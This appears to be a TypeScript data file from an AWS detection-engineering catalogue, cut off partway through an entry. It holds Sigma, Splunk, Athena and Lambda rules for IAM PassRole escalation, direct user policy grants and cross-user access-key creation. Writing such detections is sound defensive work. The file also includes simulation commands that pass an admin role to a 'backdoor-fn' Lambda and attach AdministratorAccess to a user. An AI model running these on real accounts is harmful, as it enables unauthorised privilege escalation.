export type RuleFormat = "sigma" | "splunk" | "cloudtrail" | "cloudwatch" | "eventbridge" | "lambda";

export interface RuleFormats {
  sigma?: string;
  splunk?: string;
  cloudtrail?: string;
  cloudwatch?: string;
  /** EventBridge rule pattern (detection logic, not deployment) */
  eventbridge?: string;
  /** AWS Lambda / Python implementation for real-time or enriched detections */
  lambda?: string;
}

/** Telemetry source metadata for detection engineering context */
export interface TelemetrySource {
  /** Primary log source (e.g., AWS CloudTrail) */
  primaryLogSource: string;
  /** AWS service that generates the telemetry */
  generatingService: string;
  /** Key event fields used by the detection */
  importantFields: string[];
  /** Sample AWS event JSON */
  exampleEvent: string;
}

/** Threat context (Phase 1) */
export interface ThreatContext {
  attackerBehavior: string;
  realWorldUsage?: string;
  whyItMatters: string;
  riskAndImpact: string;
}

/** Telemetry validation (Phase 2) */
export interface TelemetryValidation {
  requiredLogSources: string[];
  requiredFields: string[];
  loggingRequirements: string[];
  limitations?: string[];
}

/** Field mapping for normalization */
export interface FieldMapping {
  rawPath: string;
  normalizedPath: string;
  notes?: string;
}

/** Data modeling (Phase 3) */
export interface DataModeling {
  rawToNormalized: FieldMapping[];
  exampleNormalizedEvent: string;
}

/** Enrichment context (Phase 4) */
export interface EnrichmentContext {
  dimension: string;
  description: string;
  examples: string[];
  falsePositiveReduction?: string;
}

/** Human-readable detection logic explanation (Phase 5 Detection Logic tab) */
export interface DetectionLogicExplanation {
  humanReadable: string;
  /** Exact conditions that trigger the detection */
  conditions?: string[];
  /** Optional tuning guidance for reducing false positives */
  tuningGuidance?: string;
  /** Context about when the detection should fire */
  whenToFire?: string;
}

/** Detection quality metrics */
export interface DetectionQuality {
  signalQuality: number;
  falsePositiveRate: string;
  expectedVolume: string;
  productionReadiness: "experimental" | "validated" | "production";
}

/** Community confidence voting */
export interface CommunityConfidence {
  accurate: number;
  needsTuning: number;
  noisy: number;
  feedback?: string[];
}

/** Deployment and execution context (Phase 7) */
export interface DeploymentInfo {
  whereItRuns: string[];
  scheduling?: string;
  considerations?: string[];
}

/** Detection pipeline step for flow visualization */
export interface DetectionFlowStep {
  id: string;
  label: string;
  type: "source" | "transform" | "rule" | "alert";
}

/** Full detection lifecycle metadata */
export interface DetectionLifecycle {
  /** Short statement for overview: why this detection matters */
  whyItMatters?: string;
  threatContext?: ThreatContext;
  telemetryValidation?: TelemetryValidation;
  dataModeling?: DataModeling;
  enrichment?: EnrichmentContext[];
  logicExplanation?: DetectionLogicExplanation;
  /** Example CLI/API command to simulate the attack (for testing section) */
  simulationCommand?: string;
  deployment?: DeploymentInfo;
  detectionFlow?: DetectionFlowStep[];
  quality?: DetectionQuality;
  communityConfidence?: CommunityConfidence;
}

export interface Detection {
  id: string;
  title: string;
  description: string;
  /** Primary AWS service this rule belongs to */
  awsService: string;
  /** Additional AWS services involved in the attack/detection */
  relatedServices: string[];
  severity: "Critical" | "High" | "Medium" | "Low";
  tags: string[];
  logSources: string[];
  falsePositives: string[];
  rules: RuleFormats;
  relatedAttackSlugs: string[];
  /** Telemetry source context for detection engineers */
  telemetry?: TelemetrySource;
  /** Steps for SOC analysts to investigate the alert */
  investigationSteps?: string[];
  /** Safe lab testing procedures */
  testingSteps?: string[];
  /** Full detection lifecycle metadata (8-section page) */
  lifecycle?: DetectionLifecycle;
}

export const detections: Detection[] = [
  // --- IAM ---
  {
    id: "det-001",
    title: "IAM PassRole Privilege Escalation",
    description: "Detects when iam:PassRole is used to pass an administrative role to a Lambda function or other AWS service.",
    awsService: "IAM",
    relatedServices: ["Lambda", "STS"],
    severity: "Critical",
    tags: ["IAM", "PassRole", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate DevOps automation creating Lambda functions with appropriate roles"],
    rules: {
      sigma: `title: IAM PassRole Privilege Escalation via Lambda
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: lambda.amazonaws.com
    eventName: CreateFunction20150331
  selection_role:
    requestParameters.role|contains:
      - 'Admin'
      - 'AdministratorAccess'
      - 'PowerUser'
      - 'OrganizationAccountAccessRole'
  condition: selection and selection_role
level: critical`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=lambda.amazonaws.com eventName=CreateFunction20150331
| where like(requestParameters.role, "%Admin%") OR like(requestParameters.role, "%AdministratorAccess%") OR like(requestParameters.role, "%PowerUser%") OR like(requestParameters.role, "%OrganizationAccountAccessRole%")
| table _time, userIdentity.type, userIdentity.arn, requestParameters.functionName, requestParameters.role, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, requestParameters.functionName, requestParameters.role, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'lambda.amazonaws.com'
  AND eventName = 'CreateFunction20150331'
  AND (
    requestParameters.role LIKE '%Admin%'
    OR requestParameters.role LIKE '%AdministratorAccess%'
    OR requestParameters.role LIKE '%PowerUser%'
    OR requestParameters.role LIKE '%OrganizationAccountAccessRole%'
  )
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, eventName, requestParameters.functionName, requestParameters.role, sourceIPAddress
| filter eventSource = "lambda.amazonaws.com"
| filter eventName = "CreateFunction20150331"
| filter requestParameters.role like /Admin|AdministratorAccess|PowerUser|OrganizationAccountAccessRole/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.lambda"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["lambda.amazonaws.com"], eventName: ["CreateFunction20150331"] } }, null, 2),
      lambda: `"""
IAM PassRole Privilege Escalation via Lambda CreateFunction
Trigger: EventBridge rule matching CloudTrail CreateFunction20150331 events.
Use for: Real-time alerting when callers pass high-risk execution roles to new Lambda functions.
"""

HIGH_RISK_ROLE_MARKERS = ("Admin", "AdministratorAccess", "PowerUser", "OrganizationAccountAccessRole")

def lambda_handler(event, context):
    detail = event.get("detail", {})
    role_arn = detail.get("requestParameters", {}).get("role", "")

    if detail.get("eventSource") != "lambda.amazonaws.com":
        return {"matched": False}
    if detail.get("eventName") != "CreateFunction20150331":
        return {"matched": False}
    if not any(marker in role_arn for marker in HIGH_RISK_ROLE_MARKERS):
        return {"matched": False}

    return {
        "matched": True,
        "alert": {
            "rule_id": "det-001",
            "title": "IAM PassRole Privilege Escalation",
            "severity": "Critical",
            "actor": detail.get("userIdentity", {}).get("arn"),
            "function_name": detail.get("requestParameters", {}).get("functionName"),
            "passed_role": role_arn,
            "source_ip": detail.get("sourceIPAddress"),
            "event_time": detail.get("eventTime"),
        },
    }
`,
    },
    relatedAttackSlugs: ["aws-passrole-abuse", "iam-privilege-escalation", "lambda-privilege-escalation"],
    telemetry: {
      primaryLogSource: "AWS CloudTrail",
      generatingService: "lambda.amazonaws.com",
      importantFields: ["eventName", "userIdentity.arn", "userIdentity.type", "requestParameters.role", "sourceIPAddress", "eventSource", "eventTime"],
      exampleEvent: JSON.stringify(
        {
          eventVersion: "1.08",
          eventSource: "lambda.amazonaws.com",
          eventName: "CreateFunction20150331",
          userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" },
          requestParameters: { role: "arn:aws:iam::123456789012:role/AdminRole" },
          sourceIPAddress: "203.0.113.10",
          eventTime: "2025-02-10T12:45:00Z",
        },
        null,
        2
      ),
    },
    investigationSteps: [
      "Identify the IAM user or role that executed the action.",
      "Verify whether the Lambda function creation was expected.",
      "Inspect the IAM role that was passed in the requestParameters.role field.",
      "Review recent STS AssumeRole activity related to the same identity.",
      "Check whether the Lambda function has administrative permissions.",
      "Review recent CloudTrail events from the same source IP.",
    ],
    testingSteps: [
      "Create a Lambda function with a privileged IAM role.",
      "Ensure the role has administrative privileges.",
      "Observe the CloudTrail event for CreateFunction.",
      "Run the detection query to confirm the alert triggers.",
    ],
    lifecycle: {
      whyItMatters: "PassRole is a classic hidden escalation path in AWS because the privilege is not logged as its own API call. The abuse shows up only in the service API request where a powerful role is attached to a resource the attacker controls.",
      threatContext: {
        attackerBehavior: "An attacker with iam:PassRole and a service creation permission such as lambda:CreateFunction can create a Lambda function and assign it a more privileged execution role than the attacker currently has. Once invoked, the Lambda runs with the permissions of the passed role, effectively converting resource creation into immediate privilege escalation.",
        realWorldUsage: "PassRole abuse is a well-documented AWS escalation path in cloud red-team tradecraft, public pentest writeups, and AWS security guidance. It commonly appears in post-compromise privilege escalation chains when developers or CI roles have broad create permissions and weakly scoped role-passing permissions.",
        whyItMatters: "The attacker does not need to directly assume the target role. They only need to attach it to a service they control, which makes this a subtle but high-impact path to admin or data access.",
        riskAndImpact: "Successful abuse can lead to full administrative control, access to secrets, data exfiltration, persistence through long-lived functions, and follow-on lateral movement through the newly granted role.",
      },
      telemetryValidation: {
        requiredLogSources: ["AWS CloudTrail (management events for Lambda)"],
        requiredFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "requestParameters.functionName", "requestParameters.role", "sourceIPAddress", "eventTime"],
        loggingRequirements: ["CloudTrail management events must be enabled for Lambda API activity", "No separate iam:PassRole CloudTrail event exists; detection must infer PassRole from the service API request", "Retain requestParameters in the logging pipeline because the passed role ARN lives there"],
        limitations: ["This rule detects the Lambda CreateFunction path, not every PassRole-capable service", "Role name matching is heuristic unless enriched with authoritative high-risk role inventory", "Legitimate CI/CD pipelines often create functions and can generate false positives without actor allowlists"],
      },
      dataModeling: {
        rawToNormalized: [
          { rawPath: "eventSource", normalizedPath: "event.source", notes: "CloudTrail service that processed the API call" },
          { rawPath: "eventName", normalizedPath: "event.action", notes: "Lambda creation API" },
          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Caller identity" },
          { rawPath: "requestParameters.functionName", normalizedPath: "aws.lambda.function.name", notes: "New function name" },
          { rawPath: "requestParameters.role", normalizedPath: "aws.iam.passed_role.arn", notes: "Execution role passed during CreateFunction" },
          { rawPath: "sourceIPAddress", normalizedPath: "source.ip", notes: "Source network for the request" },
        ],
        exampleNormalizedEvent: JSON.stringify({
          "@timestamp": "2025-02-10T12:45:00Z",
          event: { category: ["iam"], type: ["change"], action: "CreateFunction20150331", outcome: "success", provider: "aws" },
          user: { arn: "arn:aws:iam::123456789012:user/dev-user", type: "IAMUser" },
          source: { ip: "203.0.113.10" },
          cloud: { provider: "aws", account: { id: "123456789012" } },
          aws: {
            lambda: { function: { name: "backdoor-fn" } },
            iam: { passed_role: { arn: "arn:aws:iam::123456789012:role/AdminRole" } },
          },
        }, null, 2),
      },
      enrichment: [
        {
          dimension: "Identity Context",
          description: "Add ownership, department, SSO role, and workload metadata for the caller to determine whether the actor is expected to deploy Lambda functions with elevated roles.",
          examples: ["SSO permission set name", "Okta group membership", "Service account owner", "CI/CD bot inventory"],
          falsePositiveReduction: "Suppress trusted deployment roles while escalating unexpected developer or workload identities.",
        },
        {
          dimension: "Passed Role Sensitivity",
          description: "Classify the role being passed by attached permissions, path, tags, and whether it grants admin, data access, or security-tool access.",
          examples: ["Role has AdministratorAccess", "Role path /security-response/", "Role tagged prod=true", "Role can access secretsmanager:GetSecretValue"],
          falsePositiveReduction: "Differentiate benign low-privilege function creation from genuinely dangerous role delegation.",
        },
        {
          dimension: "Function Deployment Context",
          description: "Enrich with deployment source, code package location, runtime, and whether the function was created by a known pipeline or management tool.",
          examples: ["Created by Terraform runner", "S3 code bucket path", "Runtime python3.12", "Known deployment account"],
          falsePositiveReduction: "Reduce alerts from expected deployments while highlighting ad hoc or one-off function creation.",
        },
        {
          dimension: "Behavioral Baseline",
          description: "Track whether the actor has previously created functions, passed this role before, or deployed to this account/region.",
          examples: ["First time CreateFunction for actor", "First time passing AdminRole", "Out-of-hours deployment"],
          falsePositiveReduction: "Raises fidelity when the action is novel for the identity or environment.",
        },
      ],
      logicExplanation: {
        humanReadable: "This detection looks for Lambda CreateFunction requests where the caller passes an execution role whose name or ARN indicates elevated privileges. Because iam:PassRole is not emitted as its own CloudTrail API event, the correct engineering approach is to inspect the downstream service API request that embeds the role ARN. The rule is intentionally focused on Lambda because it is one of the most common and operationally useful PassRole abuse paths: the attacker creates a function, attaches a powerful role, and then invokes code under that role. In production, treat Sigma as the canonical baseline, then enrich the passed role and caller identity so the detection distinguishes real escalation from authorized deployment workflows.",
        conditions: [
          "eventSource equals lambda.amazonaws.com",
          "eventName equals CreateFunction20150331",
          "requestParameters.role contains a high-risk role marker such as Admin, AdministratorAccess, PowerUser, or OrganizationAccountAccessRole",
        ],
        tuningGuidance: "1. Maintain an allowlist of approved deployment roles, CI/CD identities, and platform automation accounts. 2. Replace simple role-name heuristics with an enrichment table that classifies execution roles by attached permissions and sensitivity. 3. Escalate only when the caller is not in an approved role family or when the passed role is materially more privileged than the caller.",
        whenToFire: "Fire whenever a Lambda CreateFunction request passes a high-risk role, especially in production accounts or when initiated by a developer, workload role, or unusual source IP. In mature environments this should be a low-volume, high-signal alert after actor allowlists are applied.",
      },
      simulationCommand: "aws lambda create-function --function-name backdoor-fn --runtime python3.12 --handler lambda_function.lambda_handler --role arn:aws:iam::123456789012:role/AdminRole --zip-file fileb://function.zip",
      quality: {
        signalQuality: 8,
        falsePositiveRate: "Medium-Low (mostly CI/CD or platform deployment activity after tuning)",
        expectedVolume: "Low in mature environments; bursty during deployments",
        productionReadiness: "validated",
      },
      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
      deployment: {
        whereItRuns: ["Athena (scheduled query)", "Splunk", "Panther", "Chronicle", "Datadog", "EventBridge + Lambda"],
        scheduling: "Batch: every 5-15 minutes in Athena or SIEM; Real-time: EventBridge on CreateFunction20150331",
        considerations: ["Role sensitivity enrichment materially improves fidelity", "Because iam:PassRole itself is not logged, keep requestParameters.role intact through normalization", "Pair with post-creation Lambda invocation monitoring for higher-confidence escalation chains"],
      },
    },
  },
  {
    id: "det-004",
    title: "IAM User Policy Attachment",
    description: "Detects when an IAM policy is attached directly to a user, which may indicate privilege escalation.",
    awsService: "IAM",
    relatedServices: [],
    severity: "High",
    tags: ["IAM", "Privilege Escalation", "Policy"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Onboarding processes for new users"],
    rules: {
      sigma: `title: IAM User Policy Attachment
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName:
      - AttachUserPolicy
      - PutUserPolicy
  filter_automation:
    userIdentity.principalId|contains:
      - 'terraform'
      - 'cloudformation'
  sensitive_managed:
    requestParameters.policyArn|contains:
      - 'AdministratorAccess'
      - 'IAMFullAccess'
      - 'PowerUserAccess'
  risky_inline:
    requestParameters.policyDocument|contains:
      - '"Action":"*"'
      - '"iam:PassRole"'
      - '"sts:AssumeRole"'
      - '"secretsmanager:GetSecretValue"'
      - '"kms:Decrypt"'
  condition: selection and (sensitive_managed or risky_inline) and not filter_automation
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail (eventName=AttachUserPolicy OR eventName=PutUserPolicy)
| where NOT like(userIdentity.principalId, "%terraform%") AND NOT like(userIdentity.principalId, "%cloudformation%")
| where like(requestParameters.policyArn, "%AdministratorAccess%") OR like(requestParameters.policyArn, "%IAMFullAccess%") OR like(requestParameters.policyArn, "%PowerUserAccess%") OR like(requestParameters.policyDocument, "%\\"Action\\":\\"*\\"%") OR like(requestParameters.policyDocument, "%\\"iam:PassRole\\"%") OR like(requestParameters.policyDocument, "%\\"sts:AssumeRole\\"%") OR like(requestParameters.policyDocument, "%\\"secretsmanager:GetSecretValue\\"%") OR like(requestParameters.policyDocument, "%\\"kms:Decrypt\\"%")
| table _time, userIdentity.type, userIdentity.arn, eventName, requestParameters.userName, requestParameters.policyArn, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, eventName, requestParameters.userName, requestParameters.policyArn, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName IN ('AttachUserPolicy', 'PutUserPolicy')
  AND userIdentity.principalId NOT LIKE '%terraform%'
  AND userIdentity.principalId NOT LIKE '%cloudformation%'
  AND (
    requestParameters.policyArn LIKE '%AdministratorAccess%'
    OR requestParameters.policyArn LIKE '%IAMFullAccess%'
    OR requestParameters.policyArn LIKE '%PowerUserAccess%'
    OR requestParameters.policyDocument LIKE '%"Action":"*"%'
    OR requestParameters.policyDocument LIKE '%"iam:PassRole"%'
    OR requestParameters.policyDocument LIKE '%"sts:AssumeRole"%'
    OR requestParameters.policyDocument LIKE '%"secretsmanager:GetSecretValue"%'
    OR requestParameters.policyDocument LIKE '%"kms:Decrypt"%'
  )
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, eventName, requestParameters.userName, requestParameters.policyArn, requestParameters.policyDocument, sourceIPAddress
| filter eventSource = "iam.amazonaws.com"
| filter eventName in ["AttachUserPolicy", "PutUserPolicy"]
| filter userIdentity.principalId not like /terraform|cloudformation/
| filter requestParameters.policyArn like /AdministratorAccess|IAMFullAccess|PowerUserAccess/ or requestParameters.policyDocument like /"Action":"\*"/ or requestParameters.policyDocument like /iam:PassRole|sts:AssumeRole|secretsmanager:GetSecretValue|kms:Decrypt/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["iam.amazonaws.com"], eventName: ["AttachUserPolicy", "PutUserPolicy"] } }, null, 2),
      lambda: `"""
IAM User Policy Attachment
Trigger: EventBridge rule matching AttachUserPolicy or PutUserPolicy.
Use for: Real-time alerting on direct-to-user privilege grants.
"""

SENSITIVE_MANAGED = ("AdministratorAccess", "IAMFullAccess", "PowerUserAccess")
RISKY_INLINE = ("iam:PassRole", "sts:AssumeRole", "secretsmanager:GetSecretValue", "kms:Decrypt", '"Action":"*"')

def lambda_handler(event, context):
    detail = event.get("detail", {})
    if detail.get("eventSource") != "iam.amazonaws.com":
        return {"matched": False}
    if detail.get("eventName") not in ("AttachUserPolicy", "PutUserPolicy"):
        return {"matched": False}

    request = detail.get("requestParameters", {})
    policy_arn = request.get("policyArn", "")
    policy_document = request.get("policyDocument", "")

    if not any(x in policy_arn for x in SENSITIVE_MANAGED) and not any(x in policy_document for x in RISKY_INLINE):
        return {"matched": False}

    return {
        "matched": True,
        "alert": {
            "rule_id": "det-004",
            "title": "IAM User Policy Attachment",
            "severity": "High",
            "actor": detail.get("userIdentity", {}).get("arn"),
            "target_user": request.get("userName"),
            "policy_arn": policy_arn,
            "source_ip": detail.get("sourceIPAddress"),
            "event_time": detail.get("eventTime"),
        },
    }
`,
    },
    relatedAttackSlugs: ["iam-privilege-escalation", "assumerole-abuse", "create-policy-version-abuse", "iam-backdoor-policies"],
    telemetry: {
      primaryLogSource: "AWS CloudTrail",
      generatingService: "iam.amazonaws.com",
      importantFields: ["eventName", "userIdentity.arn", "userIdentity.principalId", "requestParameters.policyArn", "sourceIPAddress", "eventTime"],
      exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "AttachUserPolicy", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user", principalId: "AIDAEXAMPLE" }, requestParameters: { policyArn: "arn:aws:iam::123456789012:policy/AdminPolicy", userName: "target-user" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2),
    },
    investigationSteps: ["Identify the IAM user that attached the policy.", "Verify whether the policy attachment was authorized (e.g., onboarding).", "Check if userIdentity.principalId excludes Terraform/CloudFormation.", "Review the attached policy's permissions.", "Correlate with other IAM changes from the same identity."],
    testingSteps: ["Create an IAM user with AttachUserPolicy permission.", "Attach a policy to another user.", "Verify CloudTrail captures AttachUserPolicy or PutUserPolicy.", "Run the detection query to confirm the alert triggers."],
    lifecycle: {
      whyItMatters: "Direct policy attachment to an IAM user is a high-value identity change because it can grant durable privileges to a long-lived principal outside normal role- and group-based access patterns.",
      threatContext: {
        attackerBehavior: "An attacker with IAM write permissions can attach a managed policy to a user with AttachUserPolicy or embed an inline policy with PutUserPolicy. This is a common privilege-escalation and persistence path because the attacker can grant permissions directly to an existing user without creating a new role or changing trust relationships.",
        realWorldUsage: "Direct user policy grants are a well-known AWS privilege-escalation pattern in public IAM abuse research and red-team tradecraft. Attackers use them both for immediate escalation, such as attaching AdministratorAccess, and for stealthier persistence by attaching narrower customer-managed policies that still enable credential theft, AssumeRole chaining, or access to sensitive data stores.",
        whyItMatters: "Mature AWS environments usually prefer roles, groups, and federated access over direct user policy attachment. That means a sensitive policy being attached directly to a user is often uncommon enough to be high signal once approved admin and automation actors are allowlisted.",
        riskAndImpact: "If this activity goes undetected, an attacker can grant themselves or another user administrative control, create or rotate credentials, assume sensitive roles, access secrets and KMS-protected data, or disable security tooling.",
      },
      telemetryValidation: {
        requiredLogSources: ["AWS CloudTrail (management events for IAM)"],
        requiredFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "userIdentity.userName", "userIdentity.principalId", "requestParameters.userName", "requestParameters.policyArn", "requestParameters.policyName", "requestParameters.policyDocument", "sourceIPAddress", "eventTime", "recipientAccountId"],
        loggingRequirements: ["CloudTrail management events must be enabled for IAM API activity.", "The log pipeline must retain full requestParameters content because AttachUserPolicy and PutUserPolicy use different fields.", "A policy-sensitivity lookup is needed for customer-managed policy ARNs, because policyArn alone does not reveal whether the attached policy is dangerous.", "For PutUserPolicy, downstream tooling must preserve or parse requestParameters.policyDocument instead of dropping or truncating the inline JSON."],
        limitations: ["AttachUserPolicy only shows the policy ARN; it does not by itself prove the policy is sensitive unless you enrich against AWS managed policy names or customer-managed policy content.", "PutUserPolicy can be harder to normalize because policyDocument may be escaped, compacted, or parsed differently across tools.", "Legitimate onboarding, break-glass administration, Terraform, CloudFormation, and identity platform automation can generate true events that are operationally expected."],
      },
      dataModeling: {
        rawToNormalized: [
          { rawPath: "eventSource", normalizedPath: "event.source", notes: "IAM API source" },
          { rawPath: "eventName", normalizedPath: "event.action", notes: "AttachUserPolicy or PutUserPolicy" },
          { rawPath: "eventTime", normalizedPath: "@timestamp", notes: "CloudTrail event time" },
          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor principal ARN" },
          { rawPath: "userIdentity.userName", normalizedPath: "user.name", notes: "Friendly actor name when caller is IAMUser" },
          { rawPath: "requestParameters.userName", normalizedPath: "aws.iam.target_user.name", notes: "User receiving the policy" },
          { rawPath: "requestParameters.policyArn", normalizedPath: "aws.iam.policy.arn", notes: "Managed policy target for AttachUserPolicy" },
          { rawPath: "requestParameters.policyDocument", normalizedPath: "aws.iam.policy.document", notes: "Inline policy JSON for PutUserPolicy" },
        ],
        exampleNormalizedEvent: JSON.stringify({
          "@timestamp": "2025-02-10T12:45:00Z",
          event: { category: ["iam"], type: ["change"], action: "AttachUserPolicy", outcome: "success", provider: "aws" },
          user: { arn: "arn:aws:iam::123456789012:user/dev-user", name: "dev-user", type: "IAMUser", id: "AIDAEXAMPLE" },
          source: { ip: "203.0.113.10" },
          cloud: { provider: "aws", account: { id: "123456789012" } },
          aws: { iam: { target_user: { name: "target-user" }, policy: { arn: "arn:aws:iam::aws:policy/AdministratorAccess", sensitivity: "high" } } },
        }, null, 2),
      },
      enrichment: [
        { dimension: "Policy Sensitivity Classification", description: "Classify the attached policy as high, medium, or low risk using managed-policy names and customer-managed policy analysis.", examples: ["arn:aws:iam::aws:policy/AdministratorAccess", "Customer-managed policy granting iam:PassRole and sts:AssumeRole", "Inline policy granting secretsmanager:GetSecretValue and kms:Decrypt"], falsePositiveReduction: "Prevents alerting on every direct user policy change and focuses the rule on materially dangerous grants." },
        { dimension: "Actor Allowlist and Ownership Context", description: "Track which principals are approved to manage IAM users and which systems legitimately perform provisioning.", examples: ["AWSReservedSSO_AdministratorAccess", "terraform-prod-deployer", "cloudformation-execution-role", "identity-lifecycle-automation"], falsePositiveReduction: "Suppresses expected provisioning activity while preserving visibility for unexpected actors modifying users." },
        { dimension: "Target User Criticality", description: "Enrich the user receiving the policy with account type, environment, business owner, and whether the user is human, service, break-glass, or deprecated.", examples: ["Dormant developer IAM user", "Legacy service account in production", "Break-glass responder user"], falsePositiveReduction: "Helps separate routine administration of known privileged users from suspicious privilege expansion onto unexpected identities." },
        { dimension: "Source and Session Context", description: "Use source IP, MFA state, session issuer, device posture, and geo context to understand whether the action came from expected administration channels.", examples: ["Corporate VPN egress IP", "Privileged admin workstation subnet", "Assumed role from CI/CD account", "Unusual geo or unmanaged host"], falsePositiveReduction: "Raises confidence when the actor is not only non-allowlisted but also operating from an unusual session or network context." },
      ],
      logicExplanation: {
        humanReadable: "This detection should identify direct IAM user policy grants that are meaningfully dangerous, not every AttachUserPolicy or PutUserPolicy event. The strongest production pattern is to require both a user-targeted policy change and evidence that the attached managed policy or inline document is sensitive, then suppress or downgrade approved admin and automation actors. AttachUserPolicy needs enrichment because the ARN alone may represent either a benign or highly privileged policy; PutUserPolicy should inspect the inline document for wildcard admin or a curated set of high-risk actions.",
        conditions: ["eventSource equals iam.amazonaws.com", "eventName equals AttachUserPolicy or PutUserPolicy", "requestParameters.userName is present", "for AttachUserPolicy: requestParameters.policyArn maps to a sensitive managed or customer-managed policy", "for PutUserPolicy: requestParameters.policyDocument grants wildcard admin or a curated set of high-risk actions", "actor is not in an approved IAM administration or infrastructure automation allowlist"],
        tuningGuidance: "1. Maintain a policy sensitivity table instead of relying only on policy name substrings. 2. Allowlist approved IAM administrators, provisioning pipelines, Terraform, and CloudFormation by stable identity attributes such as ARN or principalId. 3. Prioritize alerts where the target user is dormant, recently created, non-admin, or outside the actor's normal ownership boundary.",
        whenToFire: "Fire when a user receives a sensitive managed policy or dangerous inline policy from an actor outside approved IAM administration workflows. In mature environments this should be low volume and high signal after actor allowlists and policy sensitivity enrichment are applied.",
      },
      simulationCommand: "aws iam attach-user-policy --user-name target-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
      quality: {
        signalQuality: 8,
        falsePositiveRate: "Medium-Low (mostly onboarding or approved IAM administration after actor allowlisting and policy sensitivity filtering)",
        expectedVolume: "Low in mature environments; higher in accounts that still use direct IAM users heavily",
        productionReadiness: "validated",
      },
      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
      deployment: {
        whereItRuns: ["Athena (scheduled query)", "Splunk", "Panther", "Chronicle", "Datadog", "CloudWatch Logs Insights", "EventBridge + Lambda"],
        scheduling: "Batch: every 5-15 minutes in Athena or SIEM pipelines; Real-time: EventBridge on AttachUserPolicy and PutUserPolicy with enrichment in Lambda or downstream SIEM.",
        considerations: ["Managed-policy sensitivity classification is mandatory for high fidelity.", "Inline policy parsing materially improves PutUserPolicy coverage.", "Actor allowlists should be centrally managed and reused across IAM detections.", "Prioritize direct-to-user grants over group or role changes because they often indicate weaker governance and stronger persistence value."],
      },
    },
  },
  {
    id: "det-010",
    title: "IAM Access Key Created for Another User",
    description: "Detects when an IAM user creates access keys for a different user, potentially establishing backdoor access.",
    awsService: "IAM",
    relatedServices: [],
    severity: "High",
    tags: ["IAM", "Persistence", "Access Keys"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Automated onboarding scripts", "Admin creating keys for service accounts"],
    rules: {
      sigma: `title: IAM Access Key Created for Another User
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName: CreateAccessKey
  target_specified:
    requestParameters.userName|exists: true
  same_user:
    userIdentity.type: IAMUser
    userIdentity.userName|fieldref: requestParameters.userName
  condition: selection and target_specified and not same_user
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventName=CreateAccessKey
| where isnotnull(requestParameters.userName)
| where (userIdentity.type="IAMUser" AND userIdentity.userName!=requestParameters.userName) OR userIdentity.type!="IAMUser"
| table _time, userIdentity.type, userIdentity.userName, userIdentity.arn, requestParameters.userName, responseElements.accessKey.accessKeyId, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.userName, userIdentity.arn, requestParameters.userName, responseElements.accessKey.accessKeyId, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName = 'CreateAccessKey'
  AND requestParameters.userName IS NOT NULL
  AND (
    (userIdentity.type = 'IAMUser' AND userIdentity.userName <> requestParameters.userName)
    OR userIdentity.type <> 'IAMUser'
  )
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.userName, userIdentity.arn, requestParameters.userName, responseElements.accessKey.accessKeyId, sourceIPAddress
| filter eventSource = "iam.amazonaws.com"
| filter eventName = "CreateAccessKey"
| filter ispresent(requestParameters.userName)
| filter (userIdentity.type = "IAMUser" and userIdentity.userName != requestParameters.userName) or userIdentity.type != "IAMUser"
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["iam.amazonaws.com"], eventName: ["CreateAccessKey"] } }, null, 2),
      lambda: `"""
IAM Access Key Created for Another User
Trigger: EventBridge rule matching CreateAccessKey.
Use for: Real-time alerting on explicit cross-user key provisioning.
"""

def lambda_handler(event, context):
    detail = event.get("detail", {})
    if detail.get("eventSource") != "iam.amazonaws.com":
        return {"matched": False}
    if detail.get("eventName") != "CreateAccessKey":
        return {"matched": False}

    request = detail.get("requestParameters", {})
    target_user = request.get("userName")
    if not target_user:
        return {"matched": False}

    actor = detail.get("userIdentity", {})
    actor_type = actor.get("type")
    actor_user = actor.get("userName")

    if actor_type == "IAMUser" and actor_user == target_user:
        return {"matched": False}

    return {
        "matched": True,
        "alert": {
            "rule_id": "det-010",
            "title": "IAM Access Key Created for Another User",
            "severity": "High",
            "actor": actor.get("arn"),
            "target_user": target_user,
